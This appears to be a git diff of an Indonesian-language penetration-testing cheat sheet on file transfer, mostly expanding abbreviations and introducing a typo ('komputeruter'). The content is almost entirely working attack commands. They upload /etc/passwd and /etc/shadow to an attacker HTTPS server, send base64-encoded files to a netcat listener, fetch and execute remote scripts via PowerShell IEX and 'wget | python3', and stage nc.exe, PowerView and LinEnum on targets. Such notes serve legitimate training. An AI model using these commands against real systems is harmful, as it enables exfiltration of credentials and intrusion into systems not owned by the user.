@@ -48,27 +48,27 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 ````
 
 ### Metode 3: SMB download
-- Server SMB di komputer attacker
+- Server SMB di komputeruter attacker
   ```
   sudo impacket-smbserver share -smb2support /tmp/smbshare
   ```
-- Dari komp target
+- Dari komputer target
   ```
   copy \\<ip>\share\nc.exe
   ```
 - Versi windows baru memblokir akses yang tidak terautentikasi
-- Server SMB di komputer attacker:
+- Server SMB di komputeruter attacker:
   ```
   sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
   ```
-- Dari komp target
+- Dari komputer target
   ```
   net use n: \\192.168.220.133\share /user:test test
   copy n:\nc.exe
    ```
 
 ### Metode 4: FTP download
-- Install server ftp di komp attacker
+- Install server ftp di komputer attacker
   ```
   sudo pip3 install pyftpdlib
   ```
@@ -76,11 +76,11 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
   ```
   sudo python3 -m pyftpdlib --port 21
   ```
-- Download dari ftp dg powershell
+- Download dari ftp dengan powershell
   ```
   (New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt', 'C:\Users\Public\ftp-file.txt')
   ```
-- Membuat ftp interaktif di komp target:
+- Membuat ftp interaktif di komputer target:
   ```
   C:\batagor> echo open <ip> > ftpcommand.txt
   C:\batagor> echo USER anonymous >> ftpcommand.txt
@@ -99,61 +99,61 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
   Ini isi file contoh
   ```
 
-### Metode 5: Upload dg encode Base64 di PowerShell
-- Di komp target
+### Metode 5: Upload dengan encode Base64 di PowerShell
+- Di komputer target
   ```
   [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
   ```
-- Salin hash dan paste di komp attacker (linux)
+- Salin hash dan paste di komputer attacker (linux)
   ```
   echo ENCODED_BASE64 > base64 -d > hosts
   ```
-- Pastikan file sama, verifikasi dg hash
+- Pastikan file sama, verifikasi dengan hash
 
 ### Metode 6: PowerShell Web Uploads
-- Di komp attacker
+- Di komputer attacker
   ```
   pip3 install uploadserver
   python3 -m uploadserver
   ```
-- Di komp target (windows)
+- Di komputer target (windows)
   ```
   IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
   Invoke-FileUpload -Uri http://<ip>:<port>/upload -File C:\Windows\System32\drivers\etc\hosts
   ```
 - Upload dengan format Base64
-- Di komp attacker
+- Di komputer attacker
   ```
   nc -lvnp 8000
   ```
-- Di komp target
+- Di komputer target
   ```
   $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
   Invoke-WebRequest -Uri http://<ip>:8000/ -Method POST -Body $b64
   ```
 
 ### Metode 7: SMB uploads
-- Di komp attacker
+- Di komputer attacker
   ```
   sudo pip3 install wsgidav cheroot
   sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
   ```
-- Tes koneksi dari komp target
+- Tes koneksi dari komputer target
   ```
   dir \\192.168.49.128\DavWWWRoot
   ```
-- Tes upload file dari komp target
+- Tes upload file dari komputer target
   ```
   copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
   copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
   ```
 
 ### Metode 7: FTP uploads
-- Di komp attacker
+- Di komputer attacker
   ```
   sudo python3 -m pyftpdlib --port 21 --write
   ```
-- Di komp target (windows)
+- Di komputer target (windows)
   ```
   (New-Object Net.WebClient).UploadFile('ftp://<ip>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
   ```
@@ -161,21 +161,21 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 <h2 align="center">Linux</h2>
 
 ### Metode 1: copas encode
-- Di komp attacker
+- Di komputer attacker
   ```
   cat id_rsa |base64 -w 0;echo
   ```
-- Di komp target
+- Di komputer target
   ```
   echo -n encoded_id_rsa | base64 -d > id_rsa
   ```
-- Verifikasi file dg hash
+- Verifikasi file dengan hash
 
-### Metode 2: donlot dari sumber online
+### Metode 2: download dari sumber online
 - Dengan wget
   ```
   wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
-  ``
+  ```
 - Dengan curl
   ```
   curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
@@ -191,8 +191,8 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
   wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
   ```
 
-### Metode 4: donlot dg bash (/dev/tcp)
-- Koneksi dh web server komp target
+### Metode 4: download dengan bash (/dev/tcp)
+- Koneksi dh web server komputer target
   ```
   exec 3<>/dev/tcp/10.10.10.32/80
   ```
@@ -205,8 +205,8 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
   cat <&3
   ```
 
-### Metode 5: SSH donlot
-- Di kmp attacker
+### Metode 5: SSH download
+- Di komputer attacker
   ```
   sudo systemctl enable ssh
   sudo systemctl start ssh
@@ -215,17 +215,17 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
   ```
   netstat -lnpt
   ```
-- Donlot dari target dg scp
+- Download dari target dengan scp
   ```
   scp plaintext@<ip>:/root/myroot.txt .
   ```
 
 ### Metode 6: web upload
-- Di komp attacker
+- Di komputer attacker
   ```
   sudo python3 -m pip install --user uploadserver
   ```
-- Buat *selfsigned certificate* (masih di komp attacker)
+- Buat *selfsigned certificate* (masih di komputer attacker)
   ```
   openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
   ```
@@ -234,7 +234,7 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
   mkdir https && cd https
   sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
   ```
-- Upload dari komp target
+- Upload dari komputer target
   ```
   curl -X POST https://<ip>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
   ```
@@ -245,7 +245,7 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 - Dengan python2.7: `python2.7 -m SimpleHTTPServer`
 - Dengan PHP: `php -S 0.0.0.0:8000`
 - Dengan ruby: `ruby -run -ehttpd . -p8000`
-- Download file dg curl/wget
+- Download file dengan curl/wget
 
 ### Metode 8: SCP upload
 
@@ -286,7 +286,7 @@ scp /path-file-yg-diupload username@10.129.86.90:/home/batagor/
     BinStream.Write(WinHttpReq.ResponseBody);
     BinStream.SaveToFile(WScript.Arguments(1));
     ```
-  - Donlot dengan skrip tadi dari windows
+  - Download dengan skrip tadi dari windows
     ```
     cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
     ```
@@ -305,11 +305,11 @@ scp /path-file-yg-diupload username@10.129.86.90:/home/batagor/
         .savetofile WScript.Arguments.Item(1), 2
     end with
     ```
-  - Donlot dengan skrip tadi dari windows
+  - Download dengan skrip tadi dari windows
     ```
     cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
     ```
-- Upload file dg python. jalankan server upload di target
+- Upload file dengan python. jalankan server upload di target
   ```
   python3 -m uploadserver 
   ```
@@ -321,18 +321,18 @@ scp /path-file-yg-diupload username@10.129.86.90:/home/batagor/
 <h2 align="center">Metode lain</h2>
 
 #### Menggunakan Netcat (nc) dan Ncat
-- Jalan di komp target
+- Jalan di komputer target
   ```
   nc -l -p 8000 > batagor.exe
   ncat -l -p 8000 --recv-only > batagor.exe
   ```
-- Jalan di komp attacker (-q 0 artinya tutup koneksi setelah selesai)
+- Jalan di komputer attacker (-q 0 artinya tutup koneksi setelah selesai)
   ```
   nc -q 0 <ip> 8000 < batagor.exe
   ncat --send-only <ip> 8000 < batagor.exe
   ```
-#### Kirim file sebagai input dg netcat dan ncat
-- Di komp attacker
+#### Kirim file sebagai input dengan netcat dan ncat
+- Di komputer attacker
   ```
   sudo nc -l -p 443 -q 0 < batagor.exe
   sudo ncat -l -p 443 --send-only < batagor.exe
